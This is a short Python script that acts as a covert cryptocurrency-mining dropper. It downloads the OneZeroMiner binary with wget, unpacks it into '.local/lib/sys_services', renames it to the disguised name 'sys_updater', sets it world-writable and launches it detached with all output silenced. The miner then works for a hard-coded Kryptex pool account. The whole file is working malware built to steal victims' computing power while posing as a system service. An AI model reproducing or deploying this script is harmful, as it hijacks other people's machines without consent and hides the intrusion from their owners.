import subprocess
import os
import sys
import time

DOWNLOAD_URL = "https://github.com/OneZeroMiner/onezerominer/releases/download/v1.4.6/onezerominer-1.4.6.tar.gz"

ARCHIVE_FILENAME = "temp_service_update.tar.gz"

ORIGINAL_EXECUTABLE_NAME = "onezerominer"

EXECUTABLE_DIRECTORY = ".local/lib/sys_services"

STEALTHY_EXECUTABLE_NAME = "sys_updater"

SERVICE_ALGORITHM = "xelishashv2"
SERVICE_SERVER = "xel.kryptex.network:7019"
SERVICE_USER = "krxXJMWJKW.Kohkol"
SERVICE_PASS = "200"

def setup_files():
    try:
        subprocess.run(['wget', DOWNLOAD_URL, '-O', ARCHIVE_FILENAME], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        os.makedirs(EXECUTABLE_DIRECTORY, exist_ok=True)

        subprocess.run(['tar', 'zxvf', ARCHIVE_FILENAME, '-C', EXECUTABLE_DIRECTORY, '--strip-components=1'], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        original_executable_path = os.path.join(EXECUTABLE_DIRECTORY, ORIGINAL_EXECUTABLE_NAME)
        stealthy_executable_path = os.path.join(EXECUTABLE_DIRECTORY, STEALTHY_EXECUTABLE_NAME)
        
        if os.path.exists(original_executable_path):
            os.rename(original_executable_path, stealthy_executable_path)
            subprocess.run(['chmod', '777', stealthy_executable_path], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return True
        else:
            return False
    except (FileNotFoundError, subprocess.CalledProcessError, Exception):
        return False
    finally:
        if os.path.exists(ARCHIVE_FILENAME):
            os.remove(ARCHIVE_FILENAME)

def start_service():
    executable_path = os.path.join(EXECUTABLE_DIRECTORY, STEALTHY_EXECUTABLE_NAME)
    
    if not os.path.exists(executable_path):
        return

    service_command = [
        executable_path,
        "-a", SERVICE_ALGORITHM,
        "-o", SERVICE_SERVER,
        "-w", SERVICE_USER,
        "--pl", SERVICE_PASS
    ]

    try:
        subprocess.Popen(service_command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL, preexec_fn=os.setsid)
    except (FileNotFoundError, Exception):
        pass

if __name__ == "__main__":
    if setup_files():
        start_service()
